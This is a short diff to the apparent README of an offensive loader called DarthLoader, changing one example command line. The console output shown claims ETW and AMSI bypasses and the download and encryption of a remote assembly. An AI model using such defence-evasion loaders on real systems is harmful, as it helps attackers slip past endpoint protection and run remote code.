@@ -16,7 +16,7 @@ DarthLoader will do the following:
 | |) |/ _` || '_||  _|| ' \ | |__ / _ \/ _` |/ _` |/ -_) | '_| 
 |___/ \__,_||_|   \__||_||_||____|\___/\__,_|\__,_|\___| |_| 
  
-PS D:\SecToolDev\DarthLoader\DarthLoader\bin\x64\Release> .\DarthLoader.exe testing123 3
+PS D:\SecToolDev\DarthLoader\DarthLoader\bin\x64\Release> .\DarthLoader.exe testing123
 [+] ETW bypassed!
 [+] AMSI bypassed!
 [*] Downloading and encrypting assembly with the key: testing123
